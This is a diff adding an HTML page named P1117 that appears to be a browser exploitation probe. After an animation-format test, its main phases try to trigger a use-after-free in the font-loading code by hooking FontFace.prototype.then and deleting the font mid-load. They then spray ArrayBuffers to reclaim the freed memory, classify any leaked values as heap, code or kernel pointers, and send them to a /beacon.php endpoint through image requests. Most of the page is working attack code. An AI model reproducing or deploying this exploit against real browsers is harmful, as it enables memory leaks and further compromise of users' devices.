@@ -1,0 +1,474 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1117</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}
+#imgs{display:flex;flex-wrap:wrap;gap:8px;margin:8px 0;align-items:center}
+#imgs img{border:2px solid #333;image-rendering:pixelated}
+#imgs .label{color:#ff0;font-size:10px;text-align:center}
+</style>
+</head><body>
+<div id="imgs"></div>
+<div id="log"></div>
+<canvas id="c" style="display:none"></canvas>
+<script>
+var L=document.getElementById('log'),IM=document.getElementById('imgs');
+var cvs=document.getElementById('c'),ctx=cvs.getContext('2d');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){
+  if(typeof v!=='bigint'||v===0n)return'';
+  var hi=Number(v>>32n);
+  if(hi>=0x10&&hi<=0xFF)return'HEAP';
+  if(hi>=0x200&&hi<=0x7FFF)return'CODE';
+  if(hi>=0xFFFF8000)return'KERN';
+  if(v<0x10000n)return'small';
+  return'val';
+}
+
+B('P1117-BOOT','');
+log('phase','=== P1117: EXACT P1112 UAF + ANIMATION FORMAT TEST ===');
+
+// =============================================
+// PHASE A: Animated GIF (red→green, 200ms per frame, infinite loop)
+// If this animates, GIF works. If not, NO animation support at all.
+// =============================================
+log('phase','--- PHASE A: Animation format test (GIF vs APNG vs CSS) ---');
+
+// Build minimal animated GIF89a: 2 frames, red and green, 64x64
+function buildAnimGIF(w,h){
+  var gif=[];
+  // Header
+  gif.push(0x47,0x49,0x46,0x38,0x39,0x61); // GIF89a
+  // Logical Screen Descriptor
+  gif.push(w&0xFF,(w>>8)&0xFF, h&0xFF,(h>>8)&0xFF);
+  gif.push(0xF1, 0x00, 0x00); // GCT flag, 4 colors (2 bits), no sort, bg=0, aspect=0
+  // Global Color Table (4 entries: red, green, blue, black)
+  gif.push(0xFF,0x00,0x00); // 0: red
+  gif.push(0x00,0xFF,0x00); // 1: green
+  gif.push(0x00,0x00,0xFF); // 2: blue
+  gif.push(0x00,0x00,0x00); // 3: black
+  // Netscape extension (infinite loop)
+  gif.push(0x21,0xFF,0x0B);
+  var ns='NETSCAPE2.0';for(var i=0;i<ns.length;i++)gif.push(ns.charCodeAt(i));
+  gif.push(0x03,0x01,0x00,0x00,0x00); // sub-block: loop count=0 (infinite)
+
+  // Frame 1: RED (color index 0)
+  // Graphic Control Extension
+  gif.push(0x21,0xF9,0x04, 0x04, 0x14,0x00, 0x00, 0x00); // delay=20 (200ms), dispose=restore bg
+  // Image Descriptor
+  gif.push(0x2C, 0x00,0x00,0x00,0x00, w&0xFF,(w>>8)&0xFF, h&0xFF,(h>>8)&0xFF, 0x00);
+  // LZW minimum code size
+  gif.push(0x02);
+  // LZW compressed data: all index 0 (red)
+  // For simplicity, use clear+data+end pattern
+  var pixels=w*h;
+  // Simple LZW: clear(4), then raw indices, then end(5)
+  // Each index is 0, packed into sub-blocks
+  // Use uncompressed LZW trick: clear code after each pixel
+  var lzw=[];
+  var clearCode=4,endCode=5;
+  // Build bit stream
+  var bits=0,nbits=0,bytes=[];
+  function writeBits(val,n){
+    bits|=(val<<nbits);nbits+=n;
+    while(nbits>=8){bytes.push(bits&0xFF);bits>>=8;nbits-=8;}
+  }
+  writeBits(clearCode,3); // initial clear
+  for(var p=0;p<pixels;p++){
+    writeBits(0,3); // pixel = color 0 (red)
+    if(p%126===125)writeBits(clearCode,3); // periodic clear to reset dictionary
+  }
+  writeBits(endCode,3);
+  if(nbits>0)bytes.push(bits&0xFF);
+  // Write sub-blocks
+  var boff=0;
+  while(boff<bytes.length){
+    var bsz=Math.min(bytes.length-boff,255);
+    gif.push(bsz);
+    for(var i=0;i<bsz;i++)gif.push(bytes[boff+i]);
+    boff+=bsz;
+  }
+  gif.push(0x00); // block terminator
+
+  // Frame 2: GREEN (color index 1)
+  gif.push(0x21,0xF9,0x04, 0x04, 0x14,0x00, 0x00, 0x00); // delay=20 (200ms)
+  gif.push(0x2C, 0x00,0x00,0x00,0x00, w&0xFF,(w>>8)&0xFF, h&0xFF,(h>>8)&0xFF, 0x00);
+  gif.push(0x02);
+  bits=0;nbits=0;bytes=[];
+  writeBits(clearCode,3);
+  for(var p=0;p<pixels;p++){
+    writeBits(1,3); // pixel = color 1 (green)
+    if(p%126===125)writeBits(clearCode,3);
+  }
+  writeBits(endCode,3);
+  if(nbits>0)bytes.push(bits&0xFF);
+  boff=0;
+  while(boff<bytes.length){
+    var bsz=Math.min(bytes.length-boff,255);
+    gif.push(bsz);
+    for(var i=0;i<bsz;i++)gif.push(bytes[boff+i]);
+    boff+=bsz;
+  }
+  gif.push(0x00);
+
+  gif.push(0x3B); // trailer
+  return new Uint8Array(gif);
+}
+
+// Build APNG
+function crc32(buf){var t=new Int32Array(256);for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c;}var r=0xFFFFFFFF;for(var i=0;i<buf.length;i++)r=t[(r^buf[i])&0xFF]^(r>>>8);return(r^0xFFFFFFFF)>>>0;}
+function u32be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF];}
+function u16be(v){return[(v>>>8)&0xFF,v&0xFF];}
+function pchunk(type,data){var tb=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];var cb=new Uint8Array(4+data.length);cb.set(tb,0);cb.set(data,4);var c=crc32(cb);return u32be(data.length).concat([].slice.call(tb)).concat([].slice.call(data)).concat(u32be(c));}
+function deflateStored(raw){var out=[],off=0;while(off<raw.length){var rem=raw.length-off,blen=Math.min(rem,65535),last=(off+blen>=raw.length)?1:0;out.push(last,blen&0xFF,(blen>>>8)&0xFF,(~blen)&0xFF,((~blen)>>>8)&0xFF);for(var i=0;i<blen;i++)out.push(raw[off+i]);off+=blen;}var a=1,b=0;for(var i=0;i<raw.length;i++){a=(a+raw[i])%65521;b=(b+a)%65521;}return[0x78,0x01].concat(out).concat(u32be((b<<16)|a));}
+function solidScan(w,h,r,g,b,a){var raw=[];for(var y=0;y<h;y++){raw.push(0);for(var x=0;x<w;x++)raw.push(r,g,b,a);}return raw;}
+var SIG=[0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A];
+
+function buildSimpleAPNG(w,h){
+  var f0=deflateStored(solidScan(w,h,0xFF,0,0,0xFF));
+  var f1=deflateStored(solidScan(w,h,0,0xFF,0,0xFF));
+  var seq=0,png=[].concat(SIG);
+  png=png.concat(pchunk('IHDR',u32be(w).concat(u32be(h),[8,6,0,0,0])));
+  png=png.concat(pchunk('acTL',u32be(2).concat(u32be(0))));
+  png=png.concat(pchunk('fcTL',u32be(seq++).concat(u32be(w),u32be(h),u32be(0),u32be(0),u16be(2),u16be(10),[0,0])));
+  png=png.concat(pchunk('IDAT',f0));
+  png=png.concat(pchunk('fcTL',u32be(seq++).concat(u32be(w),u32be(h),u32be(0),u32be(0),u16be(2),u16be(10),[0,0])));
+  png=png.concat(pchunk('fdAT',u32be(seq++).concat([].slice.call(f1))));
+  png=png.concat(pchunk('IEND',[]));
+  return new Uint8Array(png);
+}
+
+// Show test images
+function addImg(data,type,label,w,h){
+  var wrap=document.createElement('div');wrap.style.textAlign='center';
+  var lbl=document.createElement('div');lbl.className='label';lbl.textContent=label;
+  var img=document.createElement('img');
+  img.style.width=w+'px';img.style.height=h+'px';
+  var blob=new Blob([data],{type:type});
+  img.src=URL.createObjectURL(blob);
+  wrap.appendChild(lbl);wrap.appendChild(img);
+  IM.appendChild(wrap);
+  return img;
+}
+
+// CSS animation test (div that alternates red/green via CSS)
+var cssDiv=document.createElement('div');
+cssDiv.style.cssText='width:64px;height:64px;background:red;animation:blink 0.4s infinite;';
+var cssStyle=document.createElement('style');
+cssStyle.textContent='@keyframes blink{0%,49%{background:red}50%,100%{background:lime}}';
+document.head.appendChild(cssStyle);
+var cssWrap=document.createElement('div');cssWrap.style.textAlign='center';
+var cssLbl=document.createElement('div');cssLbl.className='label';cssLbl.textContent='CSS ANIM';
+cssWrap.appendChild(cssLbl);cssWrap.appendChild(cssDiv);
+IM.appendChild(cssWrap);
+
+var gifData=buildAnimGIF(16,16);
+var gifImg=addImg(gifData,'image/gif','GIF ANIM',64,64);
+
+var apngData=buildSimpleAPNG(16,16);
+var apngImg=addImg(apngData,'image/png','APNG ANIM',64,64);
+
+// Also try loading a real APNG from URL
+var realApng=document.createElement('img');
+realApng.style.width='64px';realApng.style.height='64px';
+realApng.src='https://upload.wikimedia.org/wikipedia/commons/1/14/Animated_PNG_example_bouncing_beach_ball.png';
+var realWrap=document.createElement('div');realWrap.style.textAlign='center';
+var realLbl=document.createElement('div');realLbl.className='label';realLbl.textContent='REAL APNG';
+realWrap.appendChild(realLbl);realWrap.appendChild(realApng);
+IM.appendChild(realWrap);
+
+// After 2 seconds, capture each image and report colors
+setTimeout(function(){
+  var results=[];
+
+  // Capture GIF
+  cvs.width=16;cvs.height=16;
+  ctx.clearRect(0,0,16,16);
+  try{ctx.drawImage(gifImg,0,0,16,16);}catch(e){results.push('gif=drawERR');}
+  var gid=ctx.getImageData(0,0,16,16);
+  var gr=0,gg=0,go=0;
+  for(var i=0;i<gid.data.length;i+=4){
+    if(gid.data[i]>200&&gid.data[i+1]<50)gr++;
+    else if(gid.data[i]<50&&gid.data[i+1]>200)gg++;
+    else go++;
+  }
+  results.push('gif:red='+gr+'|green='+gg+'|other='+go);
+
+  // Capture APNG
+  ctx.clearRect(0,0,16,16);
+  try{ctx.drawImage(apngImg,0,0,16,16);}catch(e){results.push('apng=drawERR');}
+  var aid=ctx.getImageData(0,0,16,16);
+  var ar=0,ag=0,ao=0;
+  for(var i=0;i<aid.data.length;i+=4){
+    if(aid.data[i]>200&&aid.data[i+1]<50)ar++;
+    else if(aid.data[i]<50&&aid.data[i+1]>200)ag++;
+    else ao++;
+  }
+  results.push('apng:red='+ar+'|green='+ag+'|other='+ao);
+
+  // Capture real APNG
+  cvs.width=140;cvs.height=140;
+  ctx.clearRect(0,0,140,140);
+  try{ctx.drawImage(realApng,0,0,140,140);
+    var rid=ctx.getImageData(0,0,140,140);
+    var uniqueColors={};
+    for(var i=0;i<rid.data.length;i+=4){
+      var key=rid.data[i]+','+rid.data[i+1]+','+rid.data[i+2];
+      uniqueColors[key]=(uniqueColors[key]||0)+1;
+    }
+    var colorCount=Object.keys(uniqueColors).length;
+    results.push('realAPNG:colors='+colorCount+'|px='+rid.data.length/4);
+  }catch(e){results.push('realAPNG=ERR:'+e.message.slice(0,60));}
+
+  // CSS animation detection
+  var cssCS=getComputedStyle(cssDiv);
+  results.push('cssAnim:bg='+cssCS.backgroundColor+'|animName='+cssCS.animationName);
+
+  B('P1117-A-FORMATS',results.join('||'));
+  log('info','Format results: '+results.join(' | '));
+
+  // Start Phase B after format tests
+  phaseB();
+},2500);
+
+// =============================================
+// PHASE B: EXACT P1112 UAF technique
+// FontFace.prototype.then hook + document.fonts.delete
+// =============================================
+function phaseB(){
+  log('phase','--- PHASE B: P1112 exact UAF (FontFace.prototype.then hook) ---');
+
+  var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+  var K=8;
+  var uafFound=false;
+  var allResults=[];
+
+  // Run 5 rounds of the exact P1112 technique
+  var round=0;
+  var maxRounds=5;
+
+  function nextRound(){
+    if(round>=maxRounds){
+      B('P1117-B-SUMMARY','rounds='+maxRounds+'|found='+uafFound+'|results='+allResults.slice(0,15).join(';'));
+      if(uafFound)log('win','Phase B: UAF data found!');
+      else log('fail','Phase B: No UAF data in '+maxRounds+' rounds');
+      phaseC();
+      return;
+    }
+
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:r"+round+";src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var ff=new FontFace('ff'+round,'local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(ff);
+    void ff.loaded;
+
+    var fired2=false,map2=null,found2=false;
+
+    // Install the then hook
+    var origThen=Object.getOwnPropertyDescriptor(FontFace.prototype,'then');
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+      if(fired2)return undefined;fired2=true;
+      if(st.parentNode)st.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight; // force layout
+      map2=[];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        for(var k=0;k<K;k++){map2.push({size:sz,ab:new ArrayBuffer(sz)});}
+      }
+      try{document.fonts.check('1em r'+round);}catch(e){}
+      return undefined;
+    },set:function(){}});
+
+    document.fonts.load('1em ff'+round+', r'+round,'AB').then(function(){},function(){});
+
+    // Poll for reclaim
+    var pollStart=10,pollEnd=350,pollStep=5;
+    for(var t=pollStart;t<=pollEnd;t+=pollStep){(function(ms,rnd){setTimeout(function(){
+      if(found2||!map2)return;
+      // Scan the 192-byte buffers (indices 32-39) plus nearby
+      for(var bi=24;bi<48;bi++){
+        if(!map2[bi])continue;
+        var b=new BigUint64Array(map2[bi].ab);
+        var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+        if(nz>0&&!found2){
+          found2=true;uafFound=true;
+          var ptrs=[];
+          for(var q=0;q<b.length;q++){
+            if(b[q]!==0n){
+              var tag=ptrTag(b[q]);
+              ptrs.push('+'+q*8+'='+hex64(b[q])+'('+tag+')');
+            }
+          }
+          var summary='r'+rnd+'|buf='+bi+'|sz='+map2[bi].size+'|nz='+nz+'|'+ptrs.join(',');
+          allResults.push(summary);
+          B('P1117-B-UAF',summary);
+          log('win','Round '+rnd+': UAF! buf='+bi+' nz='+nz+' '+ptrs.join(', '));
+        }
+      }
+    },ms);})(t,round);}
+
+    // Move to next round after poll window
+    setTimeout(function(){
+      // Restore then property
+      if(origThen){
+        Object.defineProperty(FontFace.prototype,'then',origThen);
+      }else{
+        delete FontFace.prototype.then;
+      }
+      if(!found2)allResults.push('r'+round+'|nz=0');
+      // Clean up
+      map2=null;
+      round++;
+      nextRound();
+    },400);
+  }
+  nextRound();
+}
+
+// =============================================
+// PHASE C: Extended UAF with different font names and GC patterns
+// =============================================
+function phaseC(){
+  log('phase','--- PHASE C: UAF with aggressive GC + varied patterns ---');
+
+  var SIZES=[128,160,192,224,256];
+  var K=12;
+  var cRound=0;
+  var cMax=10;
+  var cFound=false;
+  var cResults=[];
+
+  function nextC(){
+    if(cRound>=cMax){
+      B('P1117-C-SUMMARY','rounds='+cMax+'|found='+cFound+'|results='+cResults.slice(0,15).join(';'));
+      phaseD();
+      return;
+    }
+
+    // Aggressive GC before each attempt
+    var garbage=[];
+    for(var g=0;g<50;g++){
+      garbage.push(new ArrayBuffer(4096));
+      garbage.push({a:new Array(100)});
+    }
+    garbage=null;
+
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:c"+cRound+";src:local(Arial);unicode-range:U+0043;}";
+    document.head.appendChild(st);
+    var ff=new FontFace('cf'+cRound,'local(Courier)',{unicodeRange:'U+0041'});
+    document.fonts.add(ff);
+    void ff.loaded;
+
+    var fired3=false,map3=null,found3=false;
+
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+      if(fired3)return undefined;fired3=true;
+      st.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      // Extra: create DOM elements to increase layout pressure
+      var tmpDiv=document.createElement('div');
+      tmpDiv.style.fontFamily='cf'+cRound;tmpDiv.textContent='ABCDEF';
+      document.body.appendChild(tmpDiv);
+      document.body.offsetHeight;
+      document.body.removeChild(tmpDiv);
+
+      map3=[];
+      for(var si=0;si<SIZES.length;si++){
+        for(var k=0;k<K;k++){map3.push({size:SIZES[si],ab:new ArrayBuffer(SIZES[si])});}
+      }
+      return undefined;
+    },set:function(){}});
+
+    document.fonts.load('1em cf'+cRound+', c'+cRound,'X').then(function(){},function(){});
+
+    for(var t=5;t<=200;t+=3){(function(ms,rnd){setTimeout(function(){
+      if(found3||!map3)return;
+      for(var bi=0;bi<map3.length;bi++){
+        var b=new BigUint64Array(map3[bi].ab);
+        var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+        if(nz>0&&!found3){
+          found3=true;cFound=true;
+          var ptrs=[];
+          for(var q=0;q<b.length;q++){
+            if(b[q]!==0n)ptrs.push('+'+q*8+'='+hex64(b[q])+'('+ptrTag(b[q])+')');
+          }
+          cResults.push('r'+rnd+'|bi='+bi+'|sz='+map3[bi].size+'|nz='+nz+'|'+ptrs.join(','));
+          B('P1117-C-UAF','r'+rnd+'|bi='+bi+'|nz='+nz+'|'+ptrs.join(','));
+          log('win','C round '+rnd+': UAF! '+ptrs.join(', '));
+        }
+      }
+    },ms);})(t,cRound);}
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+      if(!found3)cResults.push('r'+cRound+'|0');
+      map3=null;cRound++;nextC();
+    },250);
+  }
+  nextC();
+}
+
+// =============================================
+// PHASE D: GIF drawImage timing to detect animation frame
+// If GIF animates, drawImage at different times should capture different frames
+// =============================================
+function phaseD(){
+  log('phase','--- PHASE D: GIF frame capture timing ---');
+  var gifData2=buildAnimGIF(8,8);
+  var blob=new Blob([gifData2],{type:'image/gif'});
+  var url=URL.createObjectURL(blob);
+  var img2=document.createElement('img');
+  img2.style.width='64px';img2.style.height='64px';
+  img2.style.display='block';
+  IM.appendChild(img2);
+
+  var captures=[];
+  img2.onload=function(){
+    // Capture at different times over 2 seconds
+    var delays=[0,50,100,150,200,250,300,400,500,600,700,800,900,1000,1200,1500,1800];
+    for(var d=0;d<delays.length;d++){
+      (function(ms){
+        setTimeout(function(){
+          cvs.width=8;cvs.height=8;
+          ctx.clearRect(0,0,8,8);
+          ctx.drawImage(img2,0,0,8,8);
+          var id=ctx.getImageData(0,0,8,8);
+          var r=0,g=0,o=0;
+          for(var i=0;i<id.data.length;i+=4){
+            if(id.data[i]>200&&id.data[i+1]<50)r++;
+            else if(id.data[i]<50&&id.data[i+1]>200)g++;
+            else o++;
+          }
+          captures.push(ms+'ms:r'+r+'g'+g+'o'+o);
+        },ms);
+      })(delays[d]);
+    }
+
+    setTimeout(function(){
+      B('P1117-D-GIFCAPTURE',captures.join('|'));
+      var hasGreen=captures.some(function(c){return c.indexOf('g64')>=0||c.indexOf('g8')>=0;});
+      if(hasGreen)log('win','GIF animation detected in canvas captures!');
+      else log('info','GIF captures: '+captures.slice(0,5).join(', ')+'...');
+      URL.revokeObjectURL(url);
+      phaseFinal();
+    },2200);
+  };
+  img2.onerror=function(){
+    B('P1117-D-GIFCAPTURE','LOAD_FAIL');
+    phaseFinal();
+  };
+  img2.src=url;
+}
+
+function phaseFinal(){
+  B('P1117-DONE','');
+  log('phase','=== P1117 COMPLETE ===');
+}
+</script>
+</body></html>
